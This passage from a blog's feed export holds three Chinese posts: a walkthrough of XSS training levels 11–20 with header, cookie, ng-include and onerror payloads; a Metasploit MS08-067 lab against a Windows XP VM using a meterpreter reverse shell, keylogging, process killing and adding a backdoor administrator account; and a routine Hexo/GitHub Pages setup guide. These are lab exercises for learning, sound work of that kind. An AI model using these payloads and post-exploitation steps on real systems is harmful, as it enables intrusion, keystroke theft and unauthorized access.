class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有四个隐藏的表单：</p><img src="/posts/84ce/11.png" class><p>和level10差不多，原来t_sort仍然是接受参数值的，但是里面的双引号加了htmlspecialchars()函数被编码了。</p><p>在leve11.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#在服务器端将请求头中的referer头的值赋给了str11这个变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么就可以利用这个请求头来绕过。</p><h2 id="payload-10"><a href="#payload-10" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h3><p>用burp进行抓包，发现没有referer这个请求头，可以加上，然后发现我们添加的referer头的值出现在了t_ref标签的value属性值中了。<br>所以可以直接构造：</p><pre class="line-numbers language-php"><code class="language-php">referer<span class="token punctuation">:</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/84ce/11_2.png" class><p>添加完成之后，点击发送即可。</p><h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中：</p><img src="/posts/84ce/11_3.png" class><h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><h2 id="尝试：-6"><a href="#尝试：-6" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有四个隐藏的表单：</p><img src="/posts/84ce/12.png" class><p>和level11差不多，在level 12中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#将请求中User-Agent头的值赋给了变量str11</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以利用这个请求头来绕过。</p><h2 id="payload-11"><a href="#payload-11" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一：-2"><a href="#方法一：-2" class="headerlink" title="方法一："></a>方法一：</h3><p>用burp进行抓包,发现我们添加的User-Agent头的值出现在了t_ua标签的value属性值中了。<br>所以可以直接构造：</p><pre class="line-numbers language-php"><code class="language-php">User<span class="token operator">-</span>Agent<span class="token punctuation">:</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/84ce/12_2.png" class><h3 id="方法二：-2"><a href="#方法二：-2" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中：</p><img src="/posts/84ce/12_3.png" class><h1 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h1><h2 id="尝试：-7"><a href="#尝试：-7" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有四个隐藏的表单：</p><img src="/posts/84ce/13.png" class><p>和level12差不多，在level 13中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#将请求中cookie的值赋给了变量str11</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用cookie来绕过。</p><h2 id="payload-12"><a href="#payload-12" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一：-3"><a href="#方法一：-3" class="headerlink" title="方法一："></a>方法一：</h3><p>用burp进行抓包,发现我们添加的cookie的值出现在了t_cook标签的value属性值中了。<br>所以可以直接构造：</p><pre class="line-numbers language-php"><code class="language-php">Cookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/84ce/13_2.png" class><h3 id="方法二：-3"><a href="#方法二：-3" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中</p><img src="/posts/84ce/13_3.png" class><h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><p>本关因iframe调用的文件地址失效，无法进行测试。</p><h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><p>在level15.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;body>&lt;span class="ng-include:'</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'">&lt;/span>&lt;/body>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们提交的参数src的值被插入到了<span>标签的class属性值中，但是前面还有ng-include这样的字符。</span></p><p><strong>ng-include</strong>是angular js中的东西，ng-include指令用于包含外部的HTML文件。</p><h2 id="payload-13"><a href="#payload-13" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(1)>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-php"><code class="language-php">src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(/xss/)>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在img标签中，当src指向一个不明确的地址时，会执行onerror的语句。</p><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>在level16.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明不能使用大小写绕过，将”script”,” “,”/“替换成了&amp;nbsp</p><h2 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h2><p>使用一个不需要闭合的标签，且可以用回车(回车用%a来表示)来将它们分开,构造语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup">&lt;img%0asrc=1%0aonerror=alert(‘xss’)></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><p>level17到level20因为一些浏览器的原因，无法显示图片</p><p>但其原理如下：</p><h2 id="payload-14"><a href="#payload-14" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>arg01<span class="token operator">=</span> onmousemove<span class="token operator">&amp;</span>arg02<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">/</span>xss<span class="token operator">/</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span> onmousemove<span class="token operator">=</span><span class="token string">"alert(/xss/)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>arg01<span class="token operator">=</span> onclick<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输完之后，点击图片，触发鼠标，即可绕过。</p><p><strong>注意：以上每一种方法的空格都很重要！！！</strong></p><p>或者将a标签的href更改为如下内容，利用javascript伪协议</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:alert(‘xss’)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h1><p>与level17同理</p><h1 id="level-19-level20"><a href="#level-19-level20" class="headerlink" title="level 19-level20"></a>level 19-level20</h1><p>这两关与之前的很相似，只是在于输入的onmouseover事件会被当作普通文本，而双引号又被过滤因此也不能闭合进行绕过，可以F12手动加onmouseover事件通关。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms08-067的相关应用</title>
      <link href="/posts/5a76.html"/>
      <url>/posts/5a76.html</url>
      
        <content type="html"><![CDATA[<p>本篇文章介绍关于msfconsole模块中ms08-067漏洞的一些实例应用。</p><span id="more"></span><h1 id="实验背景："><a href="#实验背景：" class="headerlink" title="实验背景："></a>实验背景：</h1><p>都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机模式哦。还有一点，有些命令无效，可能是因为模式为普通用户模式，在命令前面使用sudo就好了，或者切换为root（su root)</p><h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali             ip地址：192.168.127.139</p><p>靶机：winxpens3    ip地址：192.168.127.138</p><h1 id="ms08-067的相关应用"><a href="#ms08-067的相关应用" class="headerlink" title="ms08-067的相关应用"></a>ms08-067的相关应用</h1><h2 id="1、配置命令"><a href="#1、配置命令" class="headerlink" title="1、配置命令"></a>1、配置命令</h2><p>首先进入msfconsole界面，</p><pre class="line-numbers language-bash"><code class="language-bash">search ms08-067      <span class="token comment" spellcheck="true">#查找ms08-067漏洞</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个漏洞的基本信息：</p><img src="/posts/5a76/1.png" class><p>可以选择</p><pre class="line-numbers language-bash"><code class="language-bash">use 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用如下命令，一样的意思</p><pre class="line-numbers language-bash"><code class="language-bash">use exploit/windows/smb/ms08_067_netapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择之后，发现提示信息，按照提示信息配置：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/2.png" class><p>然后输入</p><pre class="line-numbers language-bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看哪些是yes,即必填,如果它的Current Setting为空，则要对它进行设置，如</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> RHOSTS 192.168.127.138     <span class="token comment" spellcheck="true">#设置靶机地址</span><span class="token keyword">set</span> LHOST 192.168.127.139      <span class="token comment" spellcheck="true">#设置攻击机地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、运行攻击"><a href="#2、运行攻击" class="headerlink" title="2、运行攻击"></a>2、运行攻击</h2><p>完成前面的配置之后，运行：</p><pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功进入如下界面：</p><img src="/posts/5a76/3.png" class><h2 id="3、使用screenshot命令可对靶机界面进行截图："><a href="#3、使用screenshot命令可对靶机界面进行截图：" class="headerlink" title="3、使用screenshot命令可对靶机界面进行截图："></a>3、使用screenshot命令可对靶机界面进行截图：</h2><pre class="line-numbers language-bash"><code class="language-bash">screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>截图默认保存在/home/kali目录下（命令下面会显示文件保存的路径），进入文件路径可以看到截图。</p><img src="/posts/5a76/4.png" class><h2 id="4、查看并关闭靶机打开进程"><a href="#4、查看并关闭靶机打开进程" class="headerlink" title="4、查看并关闭靶机打开进程"></a>4、查看并关闭靶机打开进程</h2><p>可以先使用ps命令查看靶机打开的进程号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后可以使用kill关闭靶机的某个进程</p><p>比如，靶机此时打开了记事本，我在攻击上使用ps查看的进程号为2516（这个进程号是随机变化的哈），使用如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> 2516<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可关闭通过攻击机关闭靶机的记事本进程</p><img src="/posts/5a76/5.png" class><h2 id="5、监听靶机键盘内容"><a href="#5、监听靶机键盘内容" class="headerlink" title="5、监听靶机键盘内容"></a>5、监听靶机键盘内容</h2><p>同样先使用ps查看靶机此时的进程及进程号，得到此时靶机记事本进程为484（靶机已经重新打开记事本进程）</p><p>然后使用：</p><pre class="line-numbers language-bash"><code class="language-bash">migrate 484        <span class="token comment" spellcheck="true">#484为靶机开启的进程号</span>keyscan_start      <span class="token comment" spellcheck="true">#开启监听靶机键盘</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在靶机上任意输一些内容，回到kali，然后输入以下命令，即可查看监听到的键盘内容</p><pre class="line-numbers language-bash"><code class="language-bash">keyscan_dump       <span class="token comment" spellcheck="true">#得到监听内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/6.png" class><h2 id="6、利用3389端口远程登录靶机"><a href="#6、利用3389端口远程登录靶机" class="headerlink" title="6、利用3389端口远程登录靶机"></a>6、利用3389端口远程登录靶机</h2><p>在Windows上创建一个名称为zt密码为pass的用户，并提升为管理员权限</p><pre class="line-numbers language-bash"><code class="language-bash">net user zt pass /add                   <span class="token comment" spellcheck="true">#创建新用户，用户名为zt密码为pass</span>net localgroup Administrators zt /add   <span class="token comment" spellcheck="true">#将用户加入Administrators组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>确保靶机的3389端口已经打开，可以在kali上使用nmap扫描靶机地址查看靶机是否开启3389端口。</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -F 192.168.127.138            <span class="token comment" spellcheck="true">#查看靶机是否开启3389端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/7.png" class><p>发现3389端口已经打开，进入下一步。</p><p>接下来重新打开一个终端，输入</p><pre class="line-numbers language-bash"><code class="language-bash">rdesktop 192.168.127.138      <span class="token comment" spellcheck="true">#远程登录靶机</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 回车后会自动弹出如图所示的登录窗口</p><img src="/posts/5a76/8.png" class><p>使用创建的账户zt,密码pass即可远程登录靶机</p><img src="/posts/5a76/9.png" class>]]></content>
      
      
      <categories>
          
          <category> msfconsole </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> msfconsole </tag>
            
            <tag> 攻击 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo + github 搭建博客</title>
      <link href="/posts/85e6.html"/>
      <url>/posts/85e6.html</url>
      
        <content type="html"><![CDATA[<p>本篇文章介绍了使用hexo+github创建博客的主要流程。我也是在考虑各方因素之后，选择了github.io的方式。优点嘛，就是免费加开源yyds！好了，进入正题。</p><span id="more"></span><h1 id="1、搭建本地环境"><a href="#1、搭建本地环境" class="headerlink" title="1、搭建本地环境"></a>1、搭建本地环境</h1><h2 id="1-1下载并安装nodejs"><a href="#1-1下载并安装nodejs" class="headerlink" title="1.1下载并安装nodejs"></a>1.1下载并安装<a href="https://nodejs.org/">nodejs</a></h2><p>安装时一路默认即可。</p><p>测试：打开cmd,输入以下测试，出现版本号即表示成功</p><pre class="line-numbers language-bash"><code class="language-bash">node -v<span class="token function">npm</span> -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/85e6/1.png" class><h2 id="1-2下载并安装git"><a href="#1-2下载并安装git" class="headerlink" title="1.2下载并安装git"></a>1.2下载并安装<a href="https://git-scm.com/downloads">git</a></h2><p>安装时也一路默认即可。</p><p>测试：打开cmd,输入如下测试，出现版本号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/85e6/2.png" class><p>并且在桌面右键鼠标，出现如下两个图标即表示成功</p><img src="/posts/85e6/3.png" class><h1 id="2、注册Github账户（已有账户的可跳过此步）"><a href="#2、注册Github账户（已有账户的可跳过此步）" class="headerlink" title="2、注册Github账户（已有账户的可跳过此步）"></a>2、注册Github账户（已有账户的可跳过此步）</h1><h2 id="2-1进入github官网，注册账号即可"><a href="#2-1进入github官网，注册账号即可" class="headerlink" title="2.1进入github官网，注册账号即可"></a>2.1进入<a href="https://github.com/">github</a>官网，注册账号即可</h2><h2 id="2-2注册完成后，连接github"><a href="#2-2注册完成后，连接github" class="headerlink" title="2.2注册完成后，连接github"></a>2.2注册完成后，连接github</h2><p>在桌面右键，选择Git Bash Here，设置用户名和邮箱（创建github账户时的用户名和邮箱）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"Github 用户名"</span><span class="token function">git</span> config --global user.email <span class="token string">"Github 邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="3、添加加密密钥"><a href="#3、添加加密密钥" class="headerlink" title="3、添加加密密钥"></a>3、添加加密密钥</h1><h2 id="3-1创建ssh密钥"><a href="#3-1创建ssh密钥" class="headerlink" title="3.1创建ssh密钥"></a>3.1创建ssh密钥</h2><p>先检查一下本地是否有.ssh文件夹：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> ~/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有，则直接进入接下这一步，有的话，可以修改路径等</p><pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"Github 邮箱"</span> <span class="token comment" spellcheck="true">#注意ssh-keygen是直接连起来的，中间没有空格</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认回车，创建完成后，可得到两个文件（因为.ssh为隐藏文件，如果没有找到.ssh项目，可以先检查一下自己的文件是否勾选隐藏的项目。.ssh的默认路径为：C:\users\用户名.ssh)</p><pre class="line-numbers language-bash"><code class="language-bash">id_rsaid_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-2添加ssh密钥到github账户"><a href="#3-2添加ssh密钥到github账户" class="headerlink" title="3.2添加ssh密钥到github账户"></a>3.2添加ssh密钥到github账户</h2><p>将id_rsa.pub的内容全部复制下来，</p><p>进入github，点击setting页面，然后选择左边栏的 SSH and GPG keys，点击 New SSH key。</p><img src="/posts/85e6/4.png" class><p>Title随便命令，将复制下来的id_rsa.pub的内容粘贴到Key中，点击Add SSH key 完成添加。</p><img src="/posts/85e6/5.png" class><h2 id="3-3验证连接"><a href="#3-3验证连接" class="headerlink" title="3.3验证连接"></a>3.3验证连接</h2><p>在桌面右击鼠标，选择Git Bash Here，输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现以下图片即表示成功：</p><img src="/posts/85e6/6.jpg" class><h1 id="4、创建github仓库"><a href="#4、创建github仓库" class="headerlink" title="4、创建github仓库"></a>4、创建github仓库</h1><ul><li><p>GitHub 主页右上角加号，选择 New repository</p></li><li><p>Repository name 中输入：用户名.github.io</p></li><li><p>Description 选填</p></li><li><p>勾选 “Add a README file”</p></li></ul><p><strong>注意：最新版的GitHub的默认分支为main,从下图可以看到（也可以自行更改为其他分支）</strong></p><p>创建后，博客地址为：https://用户名.github.io</p><img src="/posts/85e6/7.png" class><h1 id="5、安装hexo"><a href="#5、安装hexo" class="headerlink" title="5、安装hexo"></a>5、安装hexo</h1><h2 id="5-1安装"><a href="#5-1安装" class="headerlink" title="5.1安装"></a>5.1安装</h2><p>使用我们前面的环境npm即可一键安装hexo程序</p><p>鼠标右击，选择Git Bash Here，输入：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-2测试"><a href="#5-2测试" class="headerlink" title="5.2测试"></a>5.2测试</h2><p>检查是否安装成功：</p><p>在cmd或者Git Bash Here里面输入：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现相关版本号即可</p><img src="/posts/85e6/8.jpg" class><h2 id="5-3初始化并安装所需组件："><a href="#5-3初始化并安装所需组件：" class="headerlink" title="5.3初始化并安装所需组件："></a>5.3初始化并安装所需组件：</h2><p>先新建一个文件夹，在该文件夹下右击鼠标，选择Git Bash Here，输入：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init    <span class="token comment" spellcheck="true">#初始化</span><span class="token function">npm</span> <span class="token function">install</span>  <span class="token comment" spellcheck="true">#安装组件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者，直接这样运行：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init 文件名称<span class="token function">cd</span> 文件路径<span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完成后，启动服务器进行预览：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo g     <span class="token comment" spellcheck="true">#生成静态页面，或者hexo generate</span>hexo s     <span class="token comment" spellcheck="true">#启动服务，或者hexo server</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时访问：<a href="http://localhost:4000，出现hexo默认页面，表示安装成功">http://localhost:4000，出现hexo默认页面，表示安装成功</a></p><img src="/posts/85e6/9.png" class><h1 id="6、部署hexo到GitHub-Pages"><a href="#6、部署hexo到GitHub-Pages" class="headerlink" title="6、部署hexo到GitHub Pages"></a>6、部署hexo到GitHub Pages</h1><p>前面五步已经能够实现在本地访问hexo,我们的真正目的是使其部署到GitHub Pages，通过网络能够访问它。</p><h2 id="6-1安装git部署插件hexo-deployer-git"><a href="#6-1安装git部署插件hexo-deployer-git" class="headerlink" title="6.1安装git部署插件hexo-deployer-git"></a>6.1安装git部署插件hexo-deployer-git</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-2修改-config-yml站点配置文件"><a href="#6-2修改-config-yml站点配置文件" class="headerlink" title="6.2修改_config.yml站点配置文件"></a>6.2修改_config.yml站点配置文件</h2><p>在你之前创建的目录下，找到_config.yml文件，并用记事本打开，</p><p>修改末尾的Deployment 部分,</p><p><strong>注意：冒号后面一定记得有个空格！！！</strong></p><pre class="line-numbers language-bash"><code class="language-bash">deploy:type: <span class="token function">git</span>repository: git@github.com:用户名/用户名.github.io.gitbranch: main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，</p><p>repository后面的地址可从如下图所示直接复制过来</p><img src="/posts/85e6/10.png" class><p>branch后面是前面提过的默认分支，默认为main,可以修改为其他的，我把默认分支修改为了master（那就要修改为branch: master)，修改方法如下：</p><img src="/posts/85e6/11.png" class><h2 id="6-3发布文章"><a href="#6-3发布文章" class="headerlink" title="6.3发布文章"></a>6.3发布文章</h2><p>进入之前所创建的hexo的所在目录，右键Git Bash Here ，输入</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new <span class="token string">"first"</span> <span class="token comment" spellcheck="true">#创建名为"first"的文章，""里面的标题可自行命名</span>hexo g <span class="token comment" spellcheck="true">#生成静态页面</span>hexo d <span class="token comment" spellcheck="true">#将文章部署到GitHub pages，或者hexo deploy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，访问我们的GitHub域名，即：https://用户名.github.io 就可以看到hexo网站啦！`</p><h1 id="常用的hexo命令"><a href="#常用的hexo命令" class="headerlink" title="常用的hexo命令"></a>常用的hexo命令</h1><pre class="line-numbers language-bash"><code class="language-bash">hexo new <span class="token string">"name"</span>         <span class="token comment" spellcheck="true"># 新建文章</span>hexo new page <span class="token string">"name"</span>    <span class="token comment" spellcheck="true"># 新建页面</span>hexo g                  <span class="token comment" spellcheck="true"># 生成页面</span>hexo d                  <span class="token comment" spellcheck="true"># 部署</span>hexo g -d               <span class="token comment" spellcheck="true"># 生成页面并部署</span>hexo s                  <span class="token comment" spellcheck="true"># 本地预览</span>hexo clean              <span class="token comment" spellcheck="true"># 清除缓存和已生成的静态文件</span>hexo <span class="token function">help</span>               <span class="token comment" spellcheck="true"># 帮助</span>hexo --debug            <span class="token comment" spellcheck="true"># 调试模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
